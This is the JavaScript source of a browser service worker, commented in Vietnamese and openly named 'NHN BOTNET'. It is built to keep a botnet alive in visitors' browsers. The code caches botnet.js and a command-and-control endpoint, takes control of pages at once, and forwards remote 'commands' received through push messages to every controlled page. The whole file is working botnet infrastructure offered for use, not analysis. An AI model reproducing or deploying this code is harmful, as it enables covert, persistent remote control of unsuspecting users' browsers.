// ============================================================
// 🔥 NHN BOTNET - SERVICE WORKER
// 📌 Giúp botnet tồn tại vĩnh viễn trên trình duyệt
// ============================================================

const CACHE_NAME = 'nhn-botnet-v3';
const BOTNET_URLS = [
    '/',
    '/botnet.js',
    '/.netlify/functions/c2'
];

// Install - Cache botnet files
self.addEventListener('install', (event) => {
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then(cache => cache.addAll(BOTNET_URLS))
            .then(() => self.skipWaiting())
    );
});

// Activate - Take control immediately
self.addEventListener('activate', (event) => {
    event.waitUntil(
        caches.keys().then(keys => {
            return Promise.all(
                keys.filter(key => key !== CACHE_NAME)
                    .map(key => caches.delete(key))
            );
        }).then(() => self.clients.claim())
    );
});

// Fetch - Serve cached files
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // Intercept botnet requests
    if (BOTNET_URLS.some(path => url.pathname === path || url.pathname.startsWith('/.netlify/functions'))) {
        event.respondWith(
            caches.match(event.request)
                .then(response => {
                    if (response) return response;
                    return fetch(event.request)
                        .then(res => {
                            const clone = res.clone();
                            caches.open(CACHE_NAME).then(cache => cache.put(event.request, clone));
                            return res;
                        });
                })
        );
    }
});

// Push notification (lệnh từ xa)
self.addEventListener('push', (event) => {
    const data = event.data ? event.data.json() : {};
    const command = data.command || 'ping';

    // Gửi lệnh đến các clients
    self.clients.matchAll().then(clients => {
        clients.forEach(client => {
            client.postMessage({
                type: 'command',
                command: command,
                params: data.params || []
            });
        });
    });
});

// Message từ client
self.addEventListener('message', (event) => {
    const data = event.data;
    if (data.type === 'register') {
        // Client đã đăng ký, lưu lại để gửi lệnh
    }
});

console.log('[SW] NHN Botnet Service Worker loaded');